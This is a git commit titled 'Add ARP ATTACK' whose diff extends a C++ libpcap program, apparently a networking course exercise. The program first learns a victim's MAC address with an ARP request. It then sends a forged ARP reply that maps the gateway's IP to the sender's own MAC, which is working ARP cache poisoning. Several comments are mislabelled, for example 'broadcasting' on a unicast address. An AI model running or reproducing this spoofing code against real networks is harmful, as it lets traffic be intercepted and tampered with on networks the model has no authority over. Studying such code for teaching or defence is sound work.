1ccac3c131a800c8020569ac564df91c23d6e124
arad4228 <arad4228@gmail.com>
2022-08-13 09:37:17 +0900

    Add ARP ATTACK

--- main.cpp
+++ main.cpp
@@ -29,13 +29,14 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
 	}
-	char my_mac[18];
-	char target_mac[18];
-	char broadcast_mac[18];
+	char my_mac[18];				// own mac
+	//char target_mac[18];			// gateway mac
+	char broadcast_mac[18];			// ff:ff:ff:ff:ff:ff:ff
+	char sender_mac[18];			// victim mac
 
 	char my_ip[16];
-	char* sender_ip = argv[2];  // victim
-	char* target_ip = argv[3];	// gateway
+	char* sender_ip = argv[2];  	// victim
+	char* target_ip = argv[3];		// gateway
 
 	if(!get_my_mac(my_mac, dev))
 		return -1;
@@ -44,12 +45,13 @@ int main(int argc, char* argv[]) {
 
 	// 기본적인 mac을 설정
 	sprintf(broadcast_mac,"%02x:%02x:%02x:%02x:%02x:%02x", 255, 255, 255, 255, 255, 255);
-	sprintf(target_mac,"%02x:%02x:%02x:%02x:%02x:%02x", 0, 0, 0, 0, 0, 0);
+	// sprintf(targer_mac,"%02x:%02x:%02x:%02x:%02x:%02x", 0, 0, 0, 0, 0, 0);
+	sprintf(sender_mac,"%02x:%02x:%02x:%02x:%02x:%02x", 0, 0, 0, 0, 0, 0);
 
 	EthArpPacket ask_Packet;
 	// 정상적인 동작으로 상대방의 mac을 얻어오기
-	ask_Packet.eth_.dmac_ = Mac(broadcast_mac); 		// broadcasting
-	ask_Packet.eth_.smac_ = Mac(my_mac); 				// mymac
+	ask_Packet.eth_.dmac_ = Mac(broadcast_mac); 			// broadcasting
+	ask_Packet.eth_.smac_ = Mac(my_mac); 					// mymac
 	ask_Packet.eth_.type_ = htons(EthHdr::Arp);
 
 	ask_Packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -57,11 +59,10 @@ int main(int argc, char* argv[]) {
 	ask_Packet.arp_.hln_ = Mac::SIZE;
 	ask_Packet.arp_.pln_ = Ip::SIZE;
 	ask_Packet.arp_.op_ = htons(ArpHdr::Request);
-
-	ask_Packet.arp_.smac_ = Mac(my_mac);     			// my mac
-	ask_Packet.arp_.sip_ = htonl(Ip(my_ip));			// my_ip
-	ask_Packet.arp_.tmac_ = Mac(target_mac);			// gateway_mac(unknown)
-	ask_Packet.arp_.tip_ = htonl(Ip(target_ip));		// gateway_ip
+	ask_Packet.arp_.smac_ = Mac(my_mac);     				// my mac
+	ask_Packet.arp_.sip_ = htonl(Ip(my_ip));				// my_ip
+	ask_Packet.arp_.tmac_ = Mac(sender_mac);				// gateway_mac(unknown)
+	ask_Packet.arp_.tip_ = htonl(Ip(sender_ip));			// gateway_ip
 
 	// printf("ether: %s\n", ((std::string)ask_Packet.eth_.dmac()).c_str());
 	// printf("ether:%s\n", ((std::string)ask_Packet.eth_.smac()).c_str());
@@ -75,12 +76,12 @@ int main(int argc, char* argv[]) {
 	 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
 
-	EthArpPacket re_packet;
 	while(true)
 	{
 		const u_char* packet;
 		struct pcap_pkthdr* header;
-		int res = pcap_next_ex(handle, &header, &packet);
+		res = pcap_next_ex(handle, &header, &packet);
+
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
@@ -119,12 +120,34 @@ int main(int argc, char* argv[]) {
 
 		if(!re_Arp.tip().operator==(Ip(my_ip)))
 			continue;
-
-		re_packet.eth_=re_Ether;
-		re_packet.arp_=re_Arp;
+		
+		sprintf(sender_mac,"%s",((std::string)re_Ether.smac()).c_str());
+		/* 
+			현재 아는 사실 My Ip. My Mac, Target Ip, Sender Ip, Sender Mac
+ 		*/
 		break;
 	}
-	
-	
+	EthArpPacket spoof_Packet;
+	// 정상적인 동작으로 상대방의 mac을 얻어오기
+	spoof_Packet.eth_.dmac_ = Mac(sender_mac); 			// broadcasting
+	spoof_Packet.eth_.smac_ = Mac(my_mac); 					// mymac
+	spoof_Packet.eth_.type_ = htons(EthHdr::Arp);
+
+	spoof_Packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	spoof_Packet.arp_.pro_ = htons(EthHdr::Ip4);
+	spoof_Packet.arp_.hln_ = Mac::SIZE;
+	spoof_Packet.arp_.pln_ = Ip::SIZE;
+	spoof_Packet.arp_.op_ = htons(ArpHdr::Reply);
+	spoof_Packet.arp_.smac_ = Mac(my_mac);     				// my mac
+	spoof_Packet.arp_.sip_ = htonl(Ip(target_ip));				// my_ip
+	spoof_Packet.arp_.tmac_ = Mac(sender_mac);				// gateway_mac(unknown)
+	spoof_Packet.arp_.tip_ = htonl(Ip(sender_ip));			// gateway_ip
+
+
+	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoof_Packet), sizeof(EthArpPacket));
+	if (res != 0) {
+	 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	}
+
 	pcap_close(handle);
 }
